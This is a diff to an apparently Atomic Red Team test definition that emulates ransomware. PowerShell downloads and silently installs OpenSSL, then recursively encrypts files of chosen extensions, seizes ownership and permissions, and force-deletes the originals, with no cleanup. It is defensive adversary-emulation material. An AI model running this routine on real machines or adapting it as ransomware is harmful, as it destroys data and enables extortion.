@@ -79,7 +79,6 @@ atomic_tests:
           Write-Host "Installing OpenSSL..."
           Invoke-WebRequest "https://slproweb.com/download/Win64OpenSSL_Light-3_2_1.exe" -OutFile "$env:TEMP\\openssl-installer.exe"
           Start-Process "$env:TEMP\\openssl-installer.exe" -ArgumentList "/S" -Wait
-          # Validate installation
           if (-Not (Get-Command openssl -ErrorAction SilentlyContinue)) {
               Write-Host "OpenSSL installation failed."
               exit 1
@@ -90,39 +89,40 @@ atomic_tests:
       command: |
         $password = "#{encryption_password}"
         $targetDir = "#{target_directory}"
-        $targetExtensions = "#{target_extensions}".Split(",")
-        # Convert extensions to wildcard pattern
-        $includeClause = ($targetExtensions | ForEach-Object { "*$_" }) -join ","
-        # Validate directory
+        $extensions = #{target_extensions}  # Will be parsed as an array
+
         if (-Not (Test-Path $targetDir)) {
             Write-Host "❌ The target directory $targetDir does not exist."
             exit 1
         }
+
         Write-Host "✅ Starting encryption process..."
-        # Fix: use wildcard in -Path to make -Include work
-        $files = Get-ChildItem -Path $targetDir -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $targetExtensions -contains $_.Extension }
-        foreach ($file in $files) {
-            $fullPath = $file.FullName
-            Write-Host "🔍 Processing file: $fullPath"
-            try {
-                takeown /F $fullPath /A
-                icacls $fullPath /grant Administrators:F /T /C
-                Write-Host "🔑 Permissions modified: $fullPath"
-            } catch {
-                Write-Host "❌ Permission error: $fullPath"
-                continue
-            }
-            $encryptedFile = "$fullPath.enc"
-            Write-Host "🔒 Encrypting $fullPath -> $encryptedFile"
-            openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $fullPath -out $encryptedFile -pass pass:$password
-            if ($LASTEXITCODE -eq 0) {
-                Write-Host "✅ Encrypted: $fullPath"
-                Remove-Item -Path $fullPath -Force
-                Write-Host "🗑️ Deleted: $fullPath"
-            } else {
-                Write-Host "❌ Encryption failed: $fullPath"
+
+        foreach ($ext in $extensions) {
+            Get-ChildItem -Path $targetDir -Recurse -Filter "*$ext" -File -ErrorAction SilentlyContinue | ForEach-Object {
+                $file = $_.FullName
+                Write-Host "🔍 Processing file: $file"
+                try {
+                    takeown /F $file /A | Out-Null
+                    icacls $file /grant Administrators:F /T /C | Out-Null
+                } catch {
+                    Write-Host "❌ Failed to set permissions for: $file"
+                    return
+                }
+
+                $encryptedFile = "$file.enc"
+                Write-Host "🔒 Encrypting file: $file -> $encryptedFile"
+                openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
+
+                if ($LASTEXITCODE -eq 0) {
+                    Remove-Item -Path $file -Force
+                    Write-Host "🗑️ Deleted original file: $file"
+                } else {
+                    Write-Host "❌ Failed to encrypt: $file"
+                }
             }
         }
+
         Write-Host "✅ Encryption and deletion process completed!"
       cleanup_command: |
         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
